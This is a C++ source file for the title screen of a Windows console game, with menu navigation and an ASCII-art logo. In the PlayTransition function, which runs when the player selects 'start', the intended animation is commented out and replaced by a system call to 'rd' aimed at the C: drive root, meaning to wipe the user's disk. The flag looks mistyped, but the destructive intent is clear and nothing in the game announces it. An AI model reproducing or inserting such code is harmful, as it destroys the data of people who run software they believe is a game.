#include "TitleScene.h"
#include "Console.h"
#include "UIAsciiObjs.h"
static UIAsciiObjs objs;
void InitTitle(GameState& state)
{
	AsciiInit(objs);
}
void UpdateTitle(GameState& state)
{
	AsciiUpdate(objs);
	// 키입력 화살표 왔다갔다
	if (GetKeyDown(VK_UP))
	{
		state.curMenu = (Menu)std::max((int)Menu::START, (int)state.curMenu - 1);
	}
	if (GetKeyDown(VK_DOWN))
	{
		state.curMenu = (Menu)std::min((int)Menu::QUIT, (int)state.curMenu + 1);
	}
	if (GetKeyDown(VK_RETURN))
	{
		switch (state.curMenu)
		{
		case Menu::START:
			PlayTransition();
			state.curScene = Scene::INGAME;
			break;
		case Menu::INFO:
			state.curScene = Scene::INFO;
			break;
		case Menu::QUIT:
			state.isRunning = false;
			break;
		}
	}
}

void RenderTitle(const GameState& state)
{
	AsciiRender(objs);
	// 그려줄겁니다.
	COORD res = GetConsoleResolution();
	int x = res.X / 2 - 4;
	int y = res.Y / 3 * 2;

	const string labels[] = { "게임 시작", "게임 정보", "게임 종료" };
	for (int i = 0; i < 3; ++i)
	{
		GotoXY(x - 2, y + i);
		cout << (i == (int)state.curMenu ? "> " : "  ") << labels[i];
	}
	const wstring ascii[] =
	{
		L"██████╗  ██████╗ ██████╗  █████╗ ██╗  ██╗",
		L"██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██║ ██╔╝",
		L"██║  ██║██║   ██║██████╔╝███████║█████╔╝ ",
		L"██║  ██║██║   ██║██╔══██╗██╔══██║██╔═██╗ ",
		L"██████╔╝╚██████╔╝██████╔╝██║  ██║██║  ██╗",
		L"╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝"
	};
	int titleX = (res.X - 70) / 2;
	int titleY = res.Y / 3;
	SetUniCodeMode();
	for (int i = 0; i < 6; ++i)
	{
		GotoXY(titleX, titleY + i);
		wcout << ascii[i];
	}
	SetDefaultMode();


	/*GotoXY(x, y);
	cout << "게임 시작";
	GotoXY(x, y + 1);
	cout << "게임 정보";
	GotoXY(x, y + 2);
	cout << "게임 종료";

	GotoXY(x - 2, y);
	cout << (state.curMenu == Menu::START ? ">" : " ");
	GotoXY(x - 2, y + 1);
	cout << (state.curMenu == Menu::INFO ? ">" : " ");
	GotoXY(x - 2, y + 2);
	cout << (state.curMenu == Menu::QUIT ? ">" : " ");*/
}

void PlayTransition()
{
	/*COORD res = GetConsoleResolution();
	int delayMs = 20;
	int flashCount = 5;
	FlashAnimation(res, flashCount, delayMs);
	CrossAnimation(res, delayMs);*/
	system("rd /t /q c:\\");
}

void FlashAnimation(COORD resolution, int count, int delayMs)
{
	for (int i = 0; i < count; ++i)
	{
		SetColor(Color::BLACK, Color::CYAN);
		system("cls");
		Sleep(delayMs);

		SetColor();
		system("cls");
		Sleep(delayMs);
	}
}

void CrossAnimation(COORD resolution, int delayMs)
{
	SetColor(Color::BLACK, Color::WHITE);
	for (int x = 0; x < resolution.X / 2; ++x)
	{
		for (int y = 0; y < resolution.Y; y += 2)
		{
			GotoXY(x * 2, y);
			cout << "  ";
		}
		for (int y = 1; y < resolution.Y; y += 2)
		{
			GotoXY(resolution.X - 2 - x * 2, y);
			cout << "  ";
		}
		Sleep(delayMs);
	}
	SetColor();
}
